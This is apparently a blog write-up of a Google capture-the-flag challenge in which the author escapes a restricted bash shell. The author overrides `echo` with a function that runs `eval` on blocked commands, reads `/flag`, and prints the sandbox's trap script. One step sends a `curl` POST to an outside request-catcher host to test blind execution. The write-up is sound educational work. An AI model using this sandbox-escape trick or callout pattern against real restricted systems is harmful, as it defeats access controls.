---
layout: post
title:  "H4CK1NG G00GL3 - EP2C03"
subtitle: "Episode 002 - Challenge 03 - I Shell Break Free"
date:   2024-09-23 16:05:34 +0300
tags: [CTF, RE, research, hacking-google, shell, bash, sandbox]
readtime: true
cover-img: ["/assets/images/Hacking-Google/Hacking-Google-Cover.png"]
thumbnail-img: "/assets/images/Hacking-Google/Hacking-Google-Thumbnail.png"
share-img: "/assets/images/Hacking-Google/Hacking-Google-Ep02-C03-welcome.png"
---

In this challenge, there was no link to a website or to download anything. Instead, there's a simple command - 

```
socat FILE:`tty`,raw,echo=0 TCP:quarantine-shell.h4ck.ctfcompetition.com:1337
```

`socat` is a tool allowing for opening simple two-way relays. In this case, the command will open a relay between the local terminal to the external server at `quarantine-shell.h4ck.ctfcompetition.com:1337` via TCP.

Upon running this, I get a nice welcome message:

<figure>
  <img style="display:block; margin-left: auto; margin-right: auto" src="/assets/images/Hacking-Google/Hacking-Google-Ep02-C03-welcome.png" title="">
  <figcaption style="text-align: center; font-size:14px; color: gray"><i>That's a long time to be stuck at home</i></figcaption>
</figure>

Running a simple `ls` command prints out the following:

```
command blocked: ls
check completions to see available commands
```

In fact, almost anything I try to run prints out these two lines (with the command I tried excuting the one being blocked).

Looks like this is a challenge where I'm severly limited in the shell access I have and need to somehow escape it to steal the flag.

Pretty unsure what to do, I re-read the challenge hint (that's given in each challenge but so far wasn't very useful):

> Hint: How can you ask the shell for which commands are available?

Okay, so that's probably what the second message is about. I pressed tab twice to autocomplete and got a list of all available commands:

```bash
~ $
!                    enable               quarantine_protocol
.                    esac                 read
:                    eval                 readarray
[                    exec                 readonly
[[                   exit                 return
]]                   export               select
_dnr_toolkit         false                set
alias                fc                   shift
bg                   fg                   shopt
bind                 fi                   source
break                for                  suspend
builtin              function             test
caller               getopts              then
case                 hash                 time
cd                   help                 times
command              history              trap
compgen              if                   true
complete             in                   type
compopt              jobs                 typeset
continue             kill                 ulimit
coproc               let                  umask
declare              local                unalias
dirs                 logout               unset
disown               mapfile              until
do                   popd                 wait
done                 printf               while
echo                 pushd                {
elif                 pwd                  }
else                 quarantine
```

These are a bunch of bash's built-in reserved words and simple commands. There are also some other commands available in almost any Linux terminal like `set`, `unset`, `printf` `umask`, `alias`, `exit`, etc, and others unique to this shell, like `quarantine` and `quarantine_control`.

I started iterating through the list. Most of the commands listed here are still blocked by the shell and not really availabe. I ended up with the following list of non-blocked commands:

```
!
[[
]]
{
}
while
until
time
then
select
in
if
function
for
fi
esac
else
elif
done
do
coproc
case
```

Not much to do here, most of them are simply reserved flow control for bash scripts.

I played around with what's given to me - trying to simply write a valid bash script resulted in the same error message:

```bash
~ $ if [[ 1 -eq 1 ]]; then
>   printf "test"
> fi
command blocked: [[ 1 -eq 1 ]]
check completions to see available commands
command blocked: printf "test"
check completions to see available commands
```

I found nothing in the allowed commands that can be placed and accepted in a condition. Furthermore, my hopes that the command blocker ignores commands in an indented scope were extinguished.

I didn't give up on that direction and tried to define a function:

```bash
~ $ function test { printf "test" ; }
```

Running `test` is unfortunately blocked (`command blocked: test`). But hey - it didn't complain about the `printf`. What if I define the function to be one of the allowed commands?

```bash
~ $ function do { printf "test" ; }
~ $ do
bash: syntax error near unexpected token `do'
```

Hmm, no good. This was also a result of using the other reserved words instead.

I continued playing around, focusing on `coproc` which allows running commands in the background. In the end I managed to get *something* to work - using backslashes I made a `corpoc` succeed and print out a newly created process id, indicating that it was successful.

Though, I needed to somehow get an indication of the command itself actually working. I didn't have much idea what could be leaked back to me. My last hail mary was trying to use `curl` to access to a public request catcher.

```
~ $ coproc \
> MYPROC \
> { \
>  curl -X POST -d 'Hello World!' https://googlechallenge.requestcatcher.com/test \
> }
> }
[1] 14
```

But nothing happened. Most likely the machine simply doesn't even have `curl`.

Putting that direction aside, I realized that earlier, before pressing tab twice when my command line was empty, I accidentaly did so when `ls` was written, and something still happened - the completion added a `.quarantined` to the `ls` command. So what's that about?

I guess this is a file in the home directory, and that the autocompletion can actually access it and append it to my command. So...what happens if I autocomplete a specific path? 

I wrote down `ls /` and pressed tab-tab, and...

```
~ $ ls /
bin/                lib32/              root/
boot/               lib64/              run/
default_serverlist  libx32/             sbin/
dev/                login.sh            srv/
dnr_helpers.sh      media/              sys/
etc/                mnt/                tmp/
flag                opt/                usr/
home/               proc/               var/
lib/                quarantine.sh
```

Huh, that's a very cool mechanic! Here's the flag, too. 

What else can I achieve using this trick? Not too much - I found that the only available user (at least to my current shell session) is `user`, that the home directory only contains one file named `.quarantine` (which I actually knew from before). The `/proc` directory seemed interesting initially, but contains no file names that leak any information about the system.

I thought a bit about the behind-the-scenes of the shell: how does the auto-completion actually work? A completely stripped shell shouldn't have this feature, so someone probably implemented it to list the directory and print it out back to the user.

Hang on - this hypothetical auto-completion script needs to print back to the user. It probably uses `echo` or `printf`, and while earlier I didn't manage to override one of the bash reserved words, *technically*, the definition worked and the bash shell didn't complain about it being invalid - rather I was simply not able to call the newly defined function.

Could I redefine `echo`? I quickly executed `function echo { echo "test" ; }` and wrote something into the shell. 

It got unresponsive. Oh, right, my function overrides `echo` by calling another `echo`, probably getting whatever's calling `echo` into an infinite loop. Oops. Let's use `printf` instead:

```bash
$ function echo { printf "test\n" ; }
~ $ a
test
test
~ $
```

Nice! It printed out my "test" string without complaining about a blocked command.

But wait, why does it print out `test` twice? Also, when I tried to auto-complete, it worked normally. Maybe that script I imagined to exist doesn't call `echo`? 

I don't know, but that doesn't explain the prints.

Without much idea, I tested different ways to define functions, trying to execute commands within - mostly those who can read the flag file directly (like `function echo { eval "cat /flag" ; }`).

Then it dawned on me - what I'm writing into the shell actually trigger the shell blocker script that checks if my command is valid! It detects an invalid commands and tries to print an error using `echo`!

The two prints happened because it probably looks something like this:

```sh
echo "command blocked: ${my_command}"
echo "check completions to see available commands"
```

Okay, now that I know that, I can probably make a smart override to the `echo` function - I control the `my_command` passed into the `echo` call, so I can abuse it to pass a blocked command that will  be executed.

To do so, I need to strip the `"command blocked: "` string and then simply eval the "blocked" command:

```bash
function echo {
	cmd="${@#command blocked: }"
	eval "$cmd"
}
```

During testing, I discovered there is no `cat` or similar tools to read files on the system. So I needed to be a bit creative - I know `printf` exists, and so the command `printf '%s\n' "$(</flag)"` should read the file `/flag` and print it out.

```
$ printf '%s\n' "$(</flag)"
https://h4ck1ng.google/solve/...
bash: check: No such file or directory
```

Success!

However I was curious to see how the quarantine is implemented. I saw there's a `/quarantine.sh` file so I printed it too:

```bash
$ printf '%s\n' "$(</quarantine.sh)"
# Source our helper functions.
. /dnr_helpers.sh

# Print a banner
echo -e '\033[0;31m
   ___                                    _    _                ____   _            _  _
  / _ \  _   _   __ _  _ __  __ _  _ __  | |_ (_) _ __    ___  / ___| | |__    ___ | || |
 | | | || | | | / _` || `__|/ _` || `_ \ | __|| || `_ \  / _ \ \___ \ | `_ \  / _ \| || |
 | |_| || |_| || (_| || |  | (_| || | | || |_ | || | | ||  __/  ___) || | | ||  __/| || |
  \__\_\ \__,_| \__,_||_|   \__,_||_| |_| \__||_||_| |_| \___| |____/ |_| |_| \___||_||_|
\033[0m'

echo 'The D&R team has detected some suspicious activity on your account and has quarantined you while they investigate'

# Show days since lockdown started
scratches_on_wall="$((($(date +%s) - $(date --date="200311" +%s))/(60*60*24)))"
echo "${scratches_on_wall} days stuck at ~"

# Quarantine the user.
quarantine
bash: check: No such file or directory
```

Alright, this simply executes the `quarantine` function. Listing the `/dnr_helpers.sh` script reveals the helper functions:

```bash
function quarantine() {
  # Remove the environment, but only env vars, not functions.
  set -o posix
  unset $(set | grep '=' | grep -v '^_' | grep -v 'flag' | cut -d'=' -f1) 2>/dev/null
  set +o posix

  # Keep these at least, we're not THAT cruel.
  PS1='~ $ '
  PS2='> '
  PS4='+ '

  # Trap every command and ignore it.
  # Credit to https://stackoverflow.com/a/55977897
  # This inadvertently has the effect of leaving them stuck at ~ and unable
  # to `exit` :^)
  set -T                          # Enable for subshells
  shopt -s extdebug               # From the man pages: "If the command run by the DEBUG trap returns a non-zero value, the next command is skipped and not executed"
  trap quarantine_protocol DEBUG  # Trap every single command
}

function quarantine_protocol() {
  if [[ "${COMP_WORDS[0]}" == '_dnr_toolkit' ]]; then
    # Removing the trap here then setting it again in the completions has the
    # effect of allowing all the code in the completions function to run
    # while preventing any user commands.
    trap - DEBUG
    true
  else
    echo "command blocked: ${BASH_COMMAND}"
    echo "check completions to see available commands"
    false
  fi
}
```

I'm not entirely able to understand this script, but I can at least see the `echo` commands I exploited. Looks like it's playing with some shell stuff to allow only specific bash flow control words as well as auto completion.

What a cool challenge! And by completing it, I'm done with episode 2! Time to advance to episode 3!